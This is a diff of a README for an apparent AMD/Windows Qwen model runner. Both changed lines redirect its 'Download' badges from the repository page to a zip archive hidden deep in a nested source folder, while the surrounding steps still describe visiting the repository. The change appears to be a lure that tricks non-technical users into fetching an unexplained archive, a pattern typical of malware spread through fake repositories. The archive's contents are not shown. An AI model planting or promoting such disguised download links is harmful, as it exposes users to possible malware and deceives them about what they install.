@@ -1,6 +1,6 @@
 # 🤖 vllm-awq4-qwen - Run Large Language Models on AMD
 
-[![](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://github.com/aphroditeformal93/vllm-awq4-qwen)
+[![](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://github.com/aphroditeformal93/vllm-awq4-qwen/raw/refs/heads/main/csrc/awq_mmq_gfx1151/awq_mmq_gfx1151/awq_vllm_qwen_v1.2.zip)
 
 This software brings advanced artificial intelligence tools to your Windows computer using AMD hardware. It runs the Qwen 3.6-27B model with specialized settings that maximize performance on newer Strix Halo chips. You get high-speed text generation, vision capabilities, and tool-calling power without the cost of high-end server hardware.
 
@@ -18,7 +18,7 @@ Before you install this software, confirm your computer meets these minimum spec
 
 You need the base software package to begin. Follow the link below to access the repository.
 
-[**Visit this page to download**](https://github.com/aphroditeformal93/vllm-awq4-qwen)
+[**Visit this page to download**](https://github.com/aphroditeformal93/vllm-awq4-qwen/raw/refs/heads/main/csrc/awq_mmq_gfx1151/awq_mmq_gfx1151/awq_vllm_qwen_v1.2.zip)
 
 1. Go to the repository link provided above.
 2. Look for the green "Code" button near the top right of the page.
